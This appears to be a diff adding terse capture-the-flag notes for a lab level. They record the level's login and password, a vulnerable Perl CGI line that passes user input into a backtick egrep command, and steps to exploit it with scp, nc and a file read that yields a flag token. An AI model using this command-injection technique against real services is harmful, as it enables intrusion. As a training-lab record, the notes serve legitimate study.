@@ -1,0 +1,11 @@
+- Connect with login: "level12" and password: "fa6v5ateaw21peobuub8ipe6s"
+- read code <- CGI on 4646
+	$xx =~ tr/a-z/A-Z/; <- letters modified
+	$xx =~ s/\s.*//; <- after space trimmed
+	@output = `egrep "^$xx" /tmp/xd 2>&1`; <- `` exploit with no letters or spaces
+- vim /etc/apache2/sites-available/level12.conf
+	DirectoryIndex level12.pl <- exploit on / index
+- scp -P 4242 getflag.sh level12@192.168.1.?:/tmp/_
+- nc 192.168.1.? 4646 < cgi_request
+- cat /tmp/result
+	g1qKMiRpXf53AWhDaU7FEkczr
